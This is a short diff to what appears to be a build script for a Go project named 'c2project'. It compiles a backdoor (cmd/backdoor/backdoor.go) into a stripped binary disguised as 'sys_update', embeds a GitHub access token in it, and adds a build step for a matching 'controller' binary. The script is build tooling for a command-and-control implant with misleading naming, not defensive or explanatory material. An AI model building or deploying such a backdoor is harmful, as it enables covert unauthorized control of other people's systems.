@@ -5,4 +5,9 @@ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
     -ldflags="-s -w -X 'c2project/pkg/github.GithubToken=$GITHUB_PAT'" \
     -o sys_update \
     cmd/backdoor/backdoor.go
+
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
+    -ldflags="-s -w -X 'c2project/pkg/github.GithubToken=$GITHUB_PAT'" \
+    -o controller \
+    cmd/controller/controller.go
     
